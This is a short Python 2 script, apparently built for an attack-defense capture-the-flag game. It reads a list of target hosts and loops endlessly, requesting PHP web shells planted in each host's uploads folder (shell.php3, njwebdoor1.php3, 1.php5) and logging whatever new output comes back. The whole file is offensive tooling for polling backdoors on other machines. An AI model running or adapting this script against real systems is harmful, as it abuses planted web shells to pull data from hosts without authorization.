import requests
import logging
import time
import traceback

#l=logging.DEBUG
l=logging.INFO
logging.basicConfig(level=l,format='%(asctime)s %(levelname)s [%(filename)s:%(lineno)d] %(message)s',datefmt='%a, %d %b %Y %H:%M:%S')

targets=[]
#p=r'../getFlag/targets.txt'
p=r'targets.txt'
for line in open(p).readlines():
    targets.append(line.strip())
    logging.debug(line.strip())

urls=[r':20003/public/uploads/njwebdoor1.php3',r':20003/public/uploads/shell.php3',r':20003/public/uploads/1.php5']
#urls=[r'/empty.php']
m={}
while True:
    for t in targets:
        for u in urls:
            try:
                url='http://'+t+'/'+u
                logging.debug(url)
                r=requests.get(url)
                #logging.debug(r.content)
                logging.debug(r.text)
                c=r.text
                if c:
                    if m.get(t)!=c:
                        m[t]=c
                        logging.info("[ From "+t+' ] '+c)
            except Exception,e:
                logging.debug(traceback.format_exc())
    #time.sleep(10)
